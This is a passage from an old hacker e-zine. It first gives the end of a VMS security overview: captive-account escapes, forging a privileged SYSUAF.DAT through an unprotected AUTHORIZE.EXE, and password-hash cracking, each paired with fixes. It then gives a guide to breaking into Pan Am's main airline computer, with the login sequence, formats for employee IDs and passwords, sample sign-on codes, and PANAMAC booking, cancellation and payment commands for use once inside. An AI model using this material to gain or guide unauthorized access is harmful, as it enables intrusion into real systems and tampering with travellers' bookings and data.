protection is often not set up properly, programs are installed with too
much privilege etc. (Programs can be installed so they have privilege when
run even if the user running them has no privilege).

Getting a $ prompt:
-------------------
If a hacker logs into a VMS system and finds himself trapped within
application programs the first thing he will want to do is to get out to
the normal DCL command mode from where more things can be done.

Hackers will try several things and you should check to make sure they
can't try these tricks on your system.

AllInOne:

In AllInOne, DEC's popular Electronic Mail and menuing Office Automation
system, typing
     $
(the dollar sign) will by default take the user to DCL level.
Typing
     ADMIN
will get the user into the AllInOne administrator menu. From there they can
create accounts with $ access.

AllInOne mail also has a feature where macros can be attached to mail and
executed when the mail is read. If the hacker sends a message of this type
to some user with privilege, the macro can go off in the background and
create accounts, etc. for the hacker. This feature should be disabled.


Other Captive Account tricks:

Holding down <Ctrl-Y> and letting it repeat for a while will often cause
accounts that are trapped in a command procedure but not marked as CAPTIVE
in the UAF to exit from the command procedure to DCL.

If an account has access to VAXMAIL (the MAIL command) it can often use
MAIL's SPAWN command to spawn a process with DCL access.

The TPU editor has a similar SPAWN command.

If an account is not marked CAPTIVE the user can try to add /NOCOMMAND
after the username, like the following:

     Username: fred/nocommand

This will cause the command procedure to not be executed, leaving the
hacker at a DCL $ prompt.

There are many more too.

For this reason you should mark all accounts that are supposed to be
captive as CAPTIVE using the AUTHORIZE utility.


When at the $ Prompt:
---------------------
Since protection is often set incorrectly, hackers can take advantage and
use this to bypass security. A couple of examples will serve to show that
you must be diligent in setting the protections properly on systems you
manage.

If SYS$SYSTEM:AUTHORIZE.EXE is not protected, it can be run by non-
privileged users. The hacker would then run AUTHORIZE and create a new
SYSUAF.DAT file in his own directory (AUTHORIZE will do this by default if
not run in the SYS$SYSTEM directory). The hacker would add a privileged
username to the new SYSUAF.DAT, copy it back to SYS$SYSTEM:, log out, log
in again as the new privileged user, and quickly delete the new SYSUAF.DAT
so that other users don't get "Authorization Failure" messages. The hacker
would then be able to add privileged accounts to SYSUAF.DAT at his leisure.

Another clever idea would be for the hacker who has gained access to copy
SYSUAF.DAT to another directory and then try to find out what passwords are
in it. VMS uses a one-way encryption algorithm, but a gifted hacker will
use the same algorithm to repeatedly encrypt different passwords until he
finds ones that match. A copy of the VMS assembly language code to do this
encryption can be found in the appendix, for your information.

Again, setting the protection properly will keep this from happening to
your system!


Conclusion:
===========

This has been a brief overview of VMS security. For more information, read
your DEC manuals. A good place to start is the handy VMS System Manager's
Manual, Order Number AA-LA00A-TE, which can be obtained from DEC Direct and
should have come with your VMS update.

The importance of proper security cannot be over emphasized, but if you
overdo it performance will suffer. Experiment on your system to find a good
balance. Don't ignore security or you may regret it rather intensely.

            The Automatic Voice Network (AUTOVON) Outline PART I
            ----------------------------------------------------
                           Typed by: DareDevil
                           P/HUN Magazine Inc.

I am back from my long trip from London which turned out to be very intresting.
I met a couple of Hackers and Phreakers who were very willing to share
information with me. From what they say Hacking European Computers seems to be
an easy task.

Anyway.....
Heres something for you Silver Boxers. Hope this helps a little. The next 2
parts will continue in the later issues of P/HUN.

Introduction:
-------------
Ever wondered how the airline computers work? Well this article will inform
you as to various information,commands etc. The more you know about them the
more favors you can ask of them. I will go into details on how they go about
booking actual flights so you get an understanding on how its done. The article
will have actual outputs etc and explained in depth.

The best way to explain to first understand the PANAMAC computer. Then you
can go on and hack the main Pan Am computer because all the commands are the
same.

What is PANAMAC?:
----------------
PANAMAC are computers Pan Am's Sales Agent use for booking flights, answering
our various questions on arrivals,departures,visa etc.This is only a small
percentage of the questions.PANAMAC is full of info.

Where can you find answers to the these questions:

- What is a DH7 aircraft
- How many passengers were their in flight P2308 last month
- What will be the bus fair when traveling from Mombasa to Nairobi in Kenya
- What does SXR represent
- Information on carrying pets
- Where does one go for yellow fever shot in Kansas or anywhere in USA
- What is the departure tax from from anywhere in the world
- How many ciggerates is one allowed to take from USA to Pakistan
- Where to stay
- Which hotels?
- Weather conditions in a particular country
- Flight delays

Get my drift? Well the above questions can be answered using the PANAMAC.
PANAMAC is manufactured by ICOT.


Logging On to The Main Pan-Am Computer: (Not the PANAMAC )
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
[This particular info on logging on was acquired from a Pan-Am employee]
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
This is the most hardest part of all. While logging on to the Pan Am computer
you will not see any type of an identifier. These system use E,7,1
characterists.

Enter as follows:

".Nodes" or ".N" then the Node Identifier:

The Node identifier:
DDDDDDDDDDDDDDDDDDDD
This part of info will contain the NPA a person is calling from and then
followed by a 7 digit access number in which last two are the state abb.

An example would be: 71811355NY <C/R>
Its a high possiblity that the "11355" could be a zip code

The Person ID:
DDDDDDDDDDDDDD
After the Node Identifier enter:

.PI [ (NPA,8 Alpha Numeric Chracters which first being a letter)

Password
DDDDDDDD
The password is assigned to the employees which is supposed to be 6 to 8
characters alphanumeric with first being usually "P"

Enter Password using ".P" or ".PASSWORD" (No echo)

(After this you will get a long pause for about 1 min) Then if you guessed
wrong then it will log you off.

Your in!!!
DDDDDDDDDD
If you have made it so far then you are a hell of Hacker and you have my full
respect.
After you have entered correct information then you will get a message like
this:

Pan Am Airlines (4854.00PA)
Unauthorized Access will lead to a prosecution.

> ( This is the SOM Prompt)

(After that you will get a "SOM" prompt. Then from here on your home free.
The SOM is there for you. Almost all the commands in the PANAMAC will work
on their Main Computer.

DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
** NOTICE ,READ CAREFULLY **

>From here on the article will deal with PANAMAC Airline Computer which your
sales agent uses to book you a flight and give you information.
You wont be able to call these up tho, but rather use the infomation provided
here when you hack the Main Pan-Am Airline Computer. (Process is described
above)

I repeat, all the commands are on The PANAMAC will work on the Main Computer.

DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Basic PANAMAC hardware:
-----------------------
A set consists of a display screen, standard type writer key board with row of
function keys along the top. There will also be a block of keys to the right
of the main key board and another block of keys to the far right.
I will explain almost all the keys on the board.The keyboard is a little
different from the regular IBM keyboards.

Here is a list that are used the most.The rest that I did not go into details
are almost never used.
(They can be invoked by using the ALT plus the approriate key)

 For eg. The (CALC) - Use to get into calculator mode.

           +------+
           |  Z   |
 ALT  +    +------+ ----> CALCULATOR MODE

(SEG) - Leave an open segment for a passenger who may want to return at an
        unknown date but is sure that he/she will travel by Pan Am.

(IAS) - The "/" key is on the bottom of the keyboard. The letters "IAS" stand
        for Insert After Segement (will be used later in the article).

(NAME) - Name of persons traveling eg. -3smith/sethmr/danmr/loydmr  this is
        an eg. of an entry made if three person seth, dan, loyd were travelling
        a family obviosly having the same last name.

                          Part II
                          DDDDDDD
SOM/CURSOR:
----------
When they first start, the screen is divided into 4 parts (dotted
line line sepating the four fields.Each of those four field
contains the SOM (this is PANAMAC prompt).The SOM looks like
an equilateral triangle pointing towards the right.The cursor
could be in any field or left of when last used.
In this article the I have characterized the SOM as ">"
Now to move to the next field one would use the "NEXT PART" key.

SINNING IN (LOGGING IN):
------------------------
In order to use the PANAMAC the all sales agents have to sine in.
Each user is assinged 2 things:

1) COLLINS SINE: - This is needed to sine in to the phone.
2) PANAMAC SINE: - This is needed to access the computer.


COLLINS SINE:
-------------
The COLLINS SINE is a code used to access the phone system to receive calls
and make calls.This serves as an unlocking device
The collins sine consists of 9 chracters.The first is always an asterisk the
next two are CAPITALS letters almost always (SI)
Here are some examples of COLLINS SINEs :

*SI340450
*SI409321
*SI345090
*SI430092

By sinning into the telphone is exactly what I mean. One would enter in thru
the touch tones (NOT THRU THE COMP)
So therefore *SI30450 one would would enter the * ,74 for SI then the rest
of the #s.

Heres how the telephone key PAD looks :

|_______________________________________________________________|

Key Pad:
--------
IN - The IN key on the telephone key pad serves as a hold button the key will
     blink when customer is on hold.
AVI - (Available) is depressed when the sales agent is available for the
      next call.
RPT - [Unknown]

REL - (Release) Pushed when the sales agent doesn't want to be instantly
      available for the next call. Depress AVI before releasing call.
DAIL - (out dail) - Depress the key and dial out. Method :
       1) When asking for help 7714,7721,7713
       2) Pantel (Used to call up the Pan Am airport) - 8XXX-XXXX
       3) Local 212 Calls 9XXX-XXXX.
       4) All others 8XXX-XXX-XXXX
SUPV - When the sales people ask for assistance
EMGY - This key is an important one. Suppose some one makes a bomb threat
       this key is immediatly depressed and the conversation is recorded in
       another room. The sales agents have been taught to keep them online
       as much as they can.
CW -  Will be used for Call Waiting in the future.

PANAMAC SINE:
-------------
The PANAMAC SINE in consists of 10 characters with BSIA (always) the first
four. The next four are all numbers and the last 2 are letters which could be
anything.

Examples:

BSIA0290KI
BSIA8534PO
BSIA3309DS

Procedure:
----------
This is the procedure they follow:
1) Sine in to the telephone - *SI
2) Sine out - *SO ( the SO stands for sining out)
3) Sine in the computer - [PAMAMAC SINE]
4) Sine into the telephone

Now the sales agent is ready to receive calls.

General Information Index:
--------------------------
PANAMAC contains most of the technical information that is needed by the
the service representatives.

To display (G)eneral (I)nformation (I)ndex you would input:

>KIINF  followed by the first letter of the subject desired.

OUTPUT:

KIABLA - Albany Airport Info
KIATLA - Airport at Atlanta Georgia
KIAULA
KIABWA
KIBOSA
:
etc ...
:
KIZAQE

By just entering KIINF you would get all the KIINF Index from A to Z.
You can take it as if the KIINF is a root directory and its divided into
thousands of subdirectories.

The letter KI actually stands for Key In followed by the INF for
information.

For example if you wanted to display general information on car rentals
it would like this:

>KIINFC  (Type at the SOM)

The system will list car-rental related files.Then all they do is retrieve
it.

Station Information File (CITY INDEX)
------------------------------------
PANAMAC also contains information about specific cities.To display the
Index for a particular city, one is able to Key In (KI) and type in the
three letter city code. So lets say you wanted some information about
Atlanta : Type in:

>KIATL

This will display all of the files concerning Atlanta. Now to display a
particular file to view one would enter KIATL plus the the letter code of the
file name. Therefore if you wished to view the information on airports in
Atlanta enter:

>KIATLA

you will have a screen filled with all sorts of information about the Airports
in Atlanta.

Examples of some Catagories of G.I.N
------------------------------------

Index        Help On
-----        -------
KISKDE  - What type of Aircraft is an AB3 ?
KIXXKU  - What is the City Code for Kuala Lampur ?
KICCCG  - What is the currency code for Greek money and whats it called ?
KITTA   - What movies will be shown on the flights next month ?
KIIHCH  - Is there an Inter-Continental Hotel in Columbo ?
KIBOMC  - How many cigarettes are allowed for a passenger going to Bombay ?
KINYCV  - Where can one go to get a Yellow Fever shot on N.Y ?
KIJFKT  - How much will a taxi cost from JFK Airport into the city ?
KILONK  - What time did a flight PA 56 arrive in London this morning ?

Its impossible to list all the Key Ins in this article. In future I may
write up an article listing all of these.


                          Part III
                          DDDDDDDD

Booking Pan Am Flights:
-----------------------
To ask Panamac which flights are available on a specific day, you type a
standard availability entry :

>A 6JUNNYCMIA0900

Lets break it down:

- The 'A' is always used.Its is the action code to request availability
- The '6' is the departure date
- The 'JUN' is obviously the first three letters of the month
- 'NYC' is the origin city where the flight is taking off
- 'MIA' is destination city which in this case would be Miami
- and the '0900' is the time desired

So therefore on a flight on 3rd of July from Nairobi to London at 1100 hours
would be:

>A3JULNBOLON1100 [spacing is optional]

When requesting availabity FROM/TO codes should be CITY codes.This
will allow Panamac to display the full schedule of flights operating
FROM/TO all airports in that city,beginning with the time requested.
For eg. If you request availability FROM/TO JFK,Panamac will only
display flights that operate FROM/TO JFK but If you request availabilty
FROM/TO NYC, Panamac will display flights operate FROM/TO JFK and LGA

Availabity Display:
-------------------

Panamac will display up to 6 lines of both direct and connecting services
beginning with the Pan Am flights closest to the time requested.

For eg: Lets assume that one the sales agent has made the following entry
        from Newyork city to Frankfurt:

>A 18AUGNYCFRA1800

The Panamac will display the following output:

18 AUG-THU-PA HELI FREE PJ                  ALTERNATE SERVICE
1PA   72  PAJAYABOHA   JFKFRA   1830  0745*1  74X  DDD0  715
2PA   4   PAJAYABAHA   JFKFRA   1800  1215*1  74*  DDD1  1015
 :    :      :           :        :     :      :    :     :
 [and so on...]

Rememeber these are "Direct Flights" not connecting

Analyzing the first 2 lines:
---------------------------
line 1:
-------
18AUG-THU - The date you requested with the day of the week
PA HELO FREE - City Pair Message..Consists of general info
ALTERNATE SERVICES - Service other than than direct PA is programmed

Line 2:
-------
1 - Line number. PMC will display up to six lines of both direct and
    connecting service beginning with those flights closer to the time
    required
PA - PA is the airline code for Pan Am
72 - Flight number
PAJAYABOHA - Indication of classes for eg:
             P - Premium First Class
             J - Premuim Clipper Class (wide body aircraft)
             Y - Mormal Eco Class
             B - Apex fare
             H - Bulk Fare
             A - This indicate that the flight is available
             0 - No seats available (ZER0)
JFKFRA - This will tell you the departure and the arrival.Only AIRPORT
         CODES are used.
1830 - Departure time
0745 - Arrival time
*1 - This will show when the flight will arrive one day later
74X - [Self explanatory]
DDD - Indicates that meals are served if Blank then no meals served
0 - The NUMBER of time the flight will make a stop between the two airports

715 - Elapased flying timw in hours and minutes.

Sometimes after the entry of classes one may see "X plus to digits of the
week...For eg. "X13
This means that flights operates only on certain days of the week except
Mondays & Wednesdays. If blank then flights are everyday.


If no specific departure time is indicated by the passenger an availability
entry can be made indicating "A" for A.M , "P" for P.M and "N" for noon.

eg.

>P23FEBNYCAUS  --> In this case the Panamac assumes that its 1700

Short selling
-------------

Lets say one of the availability display was as follows:

10DEC
4PA  754  JAYA   JFKLHR 600  1200  74X  S  0  6:00


The departure is from JFK to london's Hethro Airport
Now suppose  you wanted to book 3 seats on this flight.They would enter as
follows:

> N3Y4

N - This the abb. for "need" for the Panamac
3 - Number os seats.In our case 3
Y - This is the class (Y in this case)
4 - This tells us the line number of the Display explained above

This method of booking seats is called short selling.[Short Sell]
incase you ever ever hear it.

The Panamac will respond with:

1PA 754 Y 10DEC  JFKLHR  HS3  600 1200

1 - This represents the numbers of flights the sales agent has booked
PA - The 2 letter code for Pan Am
754 - Is obviosly the flight #
Y - The class
10DEC - The date of departure from NYC
JFKLHR - Flight going from Newyork City to London
HS3 - (H)ave (S)old three seats confirmed
600 1200 - the the departure and arrival time

Connecting Flights:
-------------------
Many times a passenger travels from point of origin to final destination
by connecting from one flight to another at an intermediate point or points
This will be a single connection wehn only one point (City) is involved
and there is also a concept of "double connection" ... This obviously means
that the person changes flights at 2 cities.

While viewing the display a typical connecting flight would look like this

5PA 120 PAJAYABAHA 1DEC  [   ]LON  600  1200   75X  LLL0  600 400

It is a clearly visible that this is a connecting flight because we have the
elapsed time (600) and the total elapsed time of connecting service from
origin city to its destination (400)...Simple enough huh ?

Short selling is also done in this case.
Format used:

[ N ][# SEATS][CLASS][FROM A DISPLAY LINE][ITS CLASS][FROM LINE]

How to display a particular flight:
-----------------------------------
Assume that you have the following flight on an availability display

01JAN-FRI-
1PM  90  PAJAYABOHA      LAXZRH  1030  0930*1  74X     2 1515

Suppose you make a reservation on flight 90, the 01JAN and want to ask
the sales agent where the flights stops en-route and what day the flight
arrives. This is what he/she will enter into PANAMAC...

>S PA 90 / 01JAN LAX

S - Code for schedule
PA90 - Carrier code & flight number
/ - A slash as a separator
01JAN - Departure date from boardpoint
LAX - is the broad point.The three letter airport code

Output will be:

SPA90/1JANLAX
LAX   JFK    ZRH     STR    TXL
      1839   0930*1  1210*1 1400
1030  2015   1135*1  1255*1

Flight 90 departs Los Angeles (LAX) at 1030 and arrives New York (JFK) at
1839,leave New York at 2015, arrives Zurich at 0930 the next day because the
(*1) indicate it then leaves Zurich at 1135 that morning arrives in
Stuttgart (STR) 1200 ... and so on.             .

Retrieving Itinerary
--------------------
It is sometimes necessary to view the booking. This is done by using the
"*" key on the right top of the keyboard.(THE DISPLAY KEY)
Then type in "I" for itinerary.

>* I

Response will look something like this:

1 PA 90 P 13DEC JFKFRA HS3 600 1200
2 PA 95 Y 15DEC JFKFRA HS3 700 1300

[and so on ....]

Cancelation :
-----------
To cancel the booking in line 2 from above example enter:

>X 2

This will cancel the second segment. The Panamac assumes that the flight
cancelled is going to be replace by another..so therefore the next flight
one books will become the second segment automatically.

Response:

NEXT REPLACES 2
FLT SEG RELATED FACTS HAS BEEN CANCELED

To cancel multiple itinerary just enter Function Key  "XITN"

Response:

ITIN CNLD

Alternate Method: Segment Entries
---------------------------------
Sometimes the display is not necessary if you know the flight number,
Origin - Destination ,CLASS, date, # of seats.This is done by entering
whats called a "Flight Segment"...so if the flight is available then
Panamac will confirm the seats to you.
The "0" key on the keyboard is the "SEG" key.

For example if you wanted to book 4 seats from Newyork (JFK) to London's
Hethrow Airportt(LHR) in Premium First Class (P) on 3rd July  FLIGHT 90
The sales agent would enter:

>0 PA 90 P 3JUL JFKLHR NN4

The "0" is the SEGment Identifier.The NN4 means you need 4 seats.

Erasing all Flights booked:
---------------------------
To ignore all flights booked.The sales agent would enter the IGNORE TRASACTION
Function Key.This is the key displayed as "IGN".The key is located fifth
from the right side of the function keys.

>I

response:

ALL TRANSACTIONS IGNORED


                              Part IV
                              -------
Single Connections:
------------------
One has to understand in this that sometimes direct connections are not
available and therefore a second location must be used.
There are also second degree connection(also known as double connections)
In this example, an availability request between LAX(los Angeles) and JFK
(John F. Kennedy N.Y) requires a connection at a single city. It would look
like this:

>A 20APR LAXJFK P [This is just an eg. In reality there is a connection]

Output:

SVC NOT AVAILABLE IN THE SYSTEM
%2 or #2

This response obviosly means that there  is no connection going between
these two points.But after that you may get a percent followed by the month
or a number sign followed by the year. This (%) means that the service is going
to be offered in 2 months in this case or same applys for the year which is the
(#).

Therefore the agents have to know how to connect flights. They do supply them a
connection availablity chart on the side.
So lets say (just as an eg.) that there is a direct connection from the
airport in San Francisco(abb. SAN) to JFK and theres also a connection between
SAN to LAX.Then obviously SAN is used as a connecting airport.Therefore the
agent would enter:

>A 20APR LAXJFK P / 1 SAN 100 / 1

A 20APR LAXJFK P - This is a regular entry[See above for more on it]
 /  - This slash has to be be there a separator(compulsory).Also shows
      connection is to be made somewhere
 1  - O.k this will be different as in 3 cases below:
      1 - When you are sure that Pan am operates that particular route.
      2 - When sure that Pan am does not travel that route or
      3 - When not sure which one travels that route.
 SAN  - This is the first connector.
 100  - Minimum connection time allowed at the airport.
 /  - Second slash as a separator also compulsory
 1  - This entry is for the airline you are connecting to in this case its
      Pan Am.Use the third entry chart provided in the above eg.

Second Degree Connection[DOUBLE CONNECTIONS]:
-------------------------------------------
All one must do in this case is just add the another connection after the
single connection in the same form.So therefore in the above case if one wants
to go from LAX to JFK .He would have to go from:

LAX --> SAN -->[another connector airport] --> final destination JFK
--------------------------------------------------------------------

NOTE: PANAMAC cannot construct connections at a city if it entails connections
bettween different airports, i.e it cannot construct a connection if the
arrival is not LaGuardia(LGA) and departures is from JFK or arrive at CDG
and depart ORY .....Just imagine the havok it would create if one could do that
?

Flight Information:
------------------
PANAMAC provides the capability to display Flight/Arrival Departure Info
more commonly known as "FLIFO".FLIFO may be requested from the entire sequence
or for the selected broadpoint in an entry:
For example:

>2 PA 50  F 2APR MCO

2 - This is the FLIFO action code
PA 50 - is the flight number
F - This is the letter used for request departure/arrival info from selected
    city.
2 APR - The date of the departure.
MCO - is the broad point

Output will be:

2 PA50F 2APR MCO
/MCO OFF 1529 MIA IN 1611 AN ON TIME ARRIVAL
/MIA OFF 1847 LHR IN 0733

This first entry would read as follows: Pan Am flight PA 50 departed at
1529 from MIA and arrived at 1611 - Will indicate on time and so on.

To request FLIFO for a selected broad point, Enter

2 PA50 A 4DEC LHR

A - This is the request for ARRIVAL/DEPARTURE info at the city in entry
4 DEC - The arrival date
LHR - London Hethro Airport which is the arrival city.

Output:

2 PA50 A 4DEC LHR
/MIA OFF 1847 IN 0733
/LHR OFF 1150 FBU IN 1488

                             Part V
                             ------

Open Flights:
-------------
Often people who are not sure (or not stable:=)) will keep there flight open.
This has to be instructed into the Panamac.

Suppose the agent has made an entry of:

>1 PA 56 P 19APR LAXJFK HS1 1200 1600

The HS1 means that he has booked 1 seat as explained above also.
Here in the example the passenger wants a round trip ticket first class
an "open" return.Therefore it would be:

>0 PA 56 P JFKLAX QQ1

0 - Is the segment id (actually for the open)
PA - the ailine code
56 - is the flight number
P - is the class
QQ1 - This is the action code.Compulsory for the open flight booking

Response:

2 PA 56 P JFKLAX QQ1

This has actaully booked a round trip ticket from JFK - LAX "Open"

Schedule Displays:
------------------
Sometimes it is necessary to display which airlines fly a particular route
when not sure.
Suppose the agent wanted to find out the all the airline that travel at a
particular date from LAX to JFK then the entry would be:

>S 19APR LAXJFK  A

S - Entry for the (S)chedule
19APR - Date
LAXJFK - Self exp.
A - Time ,here A.M (could be also P for P.M or N for noon)

Output:

19APR-SUN-
1TW 747 FYBQM  LAXJFK 1200 1400 73S 0 111
etc...
etc...

In cases where theres is service only once or twice a week between 2 cities,
you might have to make more than one entry to request a schedule display.

Eg:

>S 1APR LHRSAN

(Do not enter time because you want  24 <--day-->24 explained later)

Output:

NO MORE FOR DISPLAY LHRSAN

o.k this mean that there is no service between these 2 points on the day
requested.O.k the PANAMAC scans this 24 hours before and 24 hours after
the date and time.This means that it has already scanned 3 days.So the next
entry would be:

>S 3FEB LHRSAN

But if there is no flight offered between the 2 points then the system would
reply:

SVC NOT IN SYS

Arrival not Known(ARNK)
-----------------------
Suppose a passenger was flying from LAX to JFK then he/she decides to take a
bus from JFK to maybe CVA (Cincinati) then from there return to LAX. This would
be considered "Arrival Not Known" (ARNK). Lets say a passenger booked a flight
from LAX to JFK

1 PA 747 Y 10APR LAXJFK HS3 1200 1600

His route from JFK to CVA is not known. Therefore this will require the ARNK
function key. The entry would be:

>0 A (or the ARNK function key)

Output:

2 ARNK

Then lets assume that you have booked a return flight from CVA back to LAX then
if you list your Itinerary it would look like:

1 PA 747 Y 10APR LAXJFK HS3 1200 1600
2 ARNK
3 PA 745 Y 20APR CVALAX HS3 1700 2100

Inserting Segment Entries:
--------------------------
Mant times its necessary to Insert Segment while booking flights. Suppose a
person is flying from Albany (ALB) to Miami (MIA) and back. His segment would
look like:

1 PA 747 B 5ARP   ALBMIA HS1 100 445
2 PA 747 B 10APR  MIAALB HS1 1200 1545

Here the passenger is sure that he will return back to ALB on the 10 of APR no
matter what. Now he may proceed to book the rest of the mid flight he wishes to
take. So therefore after landing in Miami he wishes to fly to Orlando.Its
airport code is MCO for Mc Coy Int. Now the sales agent has to make insert a
segment after the first one.

Here is how it done:

>/  1  [ Means Insert after segment #1]

/ - Symbol used to specify "Insert After Segment" Use the "/" or "IAS" key
1 - The Segment #.

The Panamac will respond  with " NEXT FOLLOWS 1 ". This indicates that your
next entry will be after 1. After Inserting segments a "*I" is necessary to
renumber the segs. Also if you want to insert a segment before 1 then enter
(/ 0).


                              Part VI
                              -------
Inputing Name Entries:
----------------------
After the flights have been booked the second part is to input all the names
of the persons who are travelling.
O.k lets say 3 people were travelling together (Tom,Bill,Cathy and assuming
that their family name is Doe)
The entry that is made into the Panamac would be as follows:

> -4  DOE / BILL MR / CATHY MRS / TOM MSTR

" - "  - The name entries has to start with a dash.
3 - Is the number of people travelling
DOE - Family name
/  - slashes are compulsory to separate names
BILL MR - bill first name and Mr. is self exp etc..

**Note SPACING IS NOT NEEDED **

The good thing about the Panamac is that the agent can assign up to 17 titles
to person which are aleardy hard core programmed:

  COL.
  GEN.
  DR.
  LCDR.
  CPT.
  LTCOL.
  MR.
  MRS.
  MS.
  STR.
  MISS.
  LT.
  SGT.
  ADM.
  MAJ.
  REV.
  CDR.

Yes Pan Am carries more military personnel than anyother airlines which by the
way is a true fact. All other titles are just spelled out.

The name entries are counted after the first "/" for the NN3 in our case.
( NN3 as mentioned above means Needed 3)

However there is an easy to do this by using the "End Item" key which comes
out on the screen as an equal sign with a vertical bar across it. Its just
like the IBM ACII VALUE 216. Therefore intread of entering (<C/R>) the agent
would just use this key and continue his/her entries for eg:
Use "!" at home.

>-1SMITHS/JOHN MR  @-1JOHNSON./CATHY MRS

The "@" represents the "End Item" Key only in our case.

Infant Names:
-------------
O.k Infant names are not booked into the Panamac but only entered. Infant
entries are ignored by stating it.This is done by entering a "I/".
Then the # of the Infant eg.

>-I / 1 JOHNSON / TWEETY MISS

Item Number / Passenger Number :
--------------------------------
Every persons are assigned an Item and Passenger number. Well it would be more
correct to say passengers.
Lets look at this entry:

-2SMITH/TOMMR/KATHYMS@-3JOHNSONS/DAVEMR/MICHELLEMS/JODYMRS

Now to display the name field the agent would enter "*N"

Output:

1.2SMITH/TOMMR/KATHYMS 3.3JOHNSONS/DAVEMR/MICHELLEMS/JODYMRS

Here 1.2 means - 1 is the Item Number assigned and 2 is the number of the
passengers etc.
There is a reason why the Item numbers is not consecutive. Its because there
are 2 names in the first entry then obviously 3 follows as the next item number
. Also in this case the infant entries are also assigned a number.

Changing name entries:
----------------------
Sometimes its necessary to change names in the entries.This is done by the
"Change" key  then just retyping the whole entry example:

1.2SMITHS/JOHBMR/MARYMRS

To chnage "Johb" to "John" the agent would enter:

-1 (Change key) 2SMITHS/JOHNMR/MARYMRS

Deleting entries is very simple.All the agent has to do is enter the Item #
and the Change Symbol (By the way the change symbol looks a square and
diagonals crossed in it.) and then press enter. From home you may use the "*"
and will work the same. So how does one delete one name from the an entry. That
question I will leave up to you guys to figure out.(Hint: Use the Passenger
number)

Inserting entries can be done in almost the same way by entering the
passenger number then the entry eg:

>-/1 -SMITH/CATMR

The first slash means "Enter after"..In our case the passenger #1.


                             Part VII
                             --------

Completing the Passenger Name & Record (PNR):
---------------------------------------------
The whole booking is not yet complete. The sales agent still have to fill three
important entries to complete the PNR.These are:

1) By who was the booking RECEIVED(passenger,militaty,T.agency,Company etc.)
2) The TELEPHONE abb. output is "FONE"
3) When the TICKETS will be issued
4) Remarks
5) The age of child if there's one travelling

The first three are mandatory to complete the PNR. Numbers 4 & 5 are optional
but the agents are encouraged to fill them out just for the records.
lets take a looks at the three mandatory ones. This article wont go over the
optional ones.

    RECIEVED:
    ---------
This field as stated clearly above identifies the party who made the booking.
The characters cannot exceed over 19.The entry should always begin with a
"6".This hardcored to interpret the recieved entry.Then comes the name of the
person. For example:

>6 MR DAVIS

The title always has to come first in case unlike inputing name entries.
Lets say if Mr. Davis worked for the American Travel Agency.Then the entry
is specified as follows:

>6 MR DAVIS/AMERICANTR

To Display the Passenger Data - Use "* P"
And the Output of the Eg. above would look like:

RCVD/RLOC-MR DAVIS/AMERICANTR

RCVD - Received
RLOC - Record Locater  and then the name.

Changing these entries is done by the CHANGE key using the same principal
of changing name entries.In this case use the field "6" then input change
symbol then retype the name.


    TELEPHONE:
    ----------
The harcored field used here is "9" not "6".
This information is entered by first typing a 9 then the "Source Of Booking"
(SOB) [See table provided for this entry]
Then a mandatory "*" sign. The SOB relates to the 6th field as we will see.
Then comes the Phone number.
If a passenger (D) booked a flight the letter "H" for Home or "B" is followed
by the telephone number and if its an agency/commercial/Interline then the
name is used.

                            S.O.B Table:
                            ------------
        Direct (Passenger) - 9 D *     Military        - 9 G *
        Government         - 9 G *     Commercial      - 9 C *
        Travel Agent       - 9 A *     Interline       - 9 I *

Lets say you booked a flight and your phone number was 7185551234 and that was
your business number, the Entry made would be:

>9 D *  718/5551234 B

If the "*P" is invoked then it would display :

RCVD/RLOC -MR DAVIS
FONE-NYC-A 718/5551234 B


The "FONE" serves to indicate the Telephone field. The the NYC has nothing to
do with the NPA of the passengers phone number but it indicates the city
location of the Panamac set where the booking was made. The "A" after the NYC
is taken from the S.O.B table.

Passenger Relating:
-------------------
The first entry in the FONE field always belongs to the person/company/
Travel agency etc in the RCVD field. You can enter additional phone numbers
using the same format as the first FONE entry. On additional entries,you must
specify which passenger or passengers the phone number is for. This is done by
including in the FONE entry the PASSENGERS NAME NUMBER of the person(s)
who can be reached at that phone. This proccess is called PASSENGER RELATING

Lets say we have the entry:

1.2SMITH/JOHNMR/MARYMRS
1 PA 56 B 19APR JFKLAX HS2 600 1000
RCVD/RLOC-AMERICAN TR. AGENCY
FONE-NYC-A 718/555-1234 H

The Smiths, John  & Mary have the same home fone number.Therefore passenger
1-2 have the same #s.This has to be specified into the PANAMAC by:

>9 1-2 A*  718/555-4321 H

To display NAME,ITINENARY,RCVD AND FONE at the same time enter:

>*R (Record)

Output:

1.2/SMITH/JOHNMR/MARY COL
1 PA 56 B 19APR JFKLAX HS2 600 1000
RCVD/RLOC-AMERICAN TR. AGENCY
FONE-NYC-A 718/555-1234 American Tr.Agency
2.1-2 NYC-A 718/555-4321 H

etc...

Changing entries is a simple task. Lets assume the sales agent wants to change
the first FONE entry which is for the Travel Agency.The command would be:

>9 1 (Change Symbol) A*  [FONE number & and the name of the agency]

9 - fone entry
1 - First entry.(2.)would be the second FONE entry which is the Passenger home
    fone number.( If there was a third entry it would start with (3.) and so
    on..
A* - From  SOB

Deletion of the entries I will leave you to figure out.

Address Entries & Payment:
--------------------------
The Address entries and the form of payment are included in FONE entry as
well. This was the Info is stored in the PNR until the time of ticketing.


Address: [Use same format]

>9 1-2 C* 42-95 ELM STREET / FLUSHING N.Y 10011

Payment:

>9 D * AX 1234 567 11111 EXP 9/90 MR DAN DAVIS


Ticket Entries:
---------------

The Entries in the Ticketing field tell us if the passengers already has a
ticket or when and how its going to be issued.(Mail etc.) or when its going to
be cancelled.A ticketing code is issued for these situations:

                        Ticket Codez
                        ------------
         W - Here ticket will be issued on the date entered. Passenger will
             pick it up on that date.
         U - The ticket is mailed here(TBM) on date entered
         Q - Here the ticket will be given by the travel agency on date entered
         O - Ticketed

The field used here is "7" hardcored for Ticketing purposes.

Typical entry:

>7 W APR19

Usually one day after is added to APR19 so that passenger has the whole day
to purchase the ticket. The entry then would look like:

>7 W APR20 * APR 19

The "*" is mandatory.

Mailing:
-------
Lets look at an example of TBM:

>7 U 19ARP * CK FOR CHECK

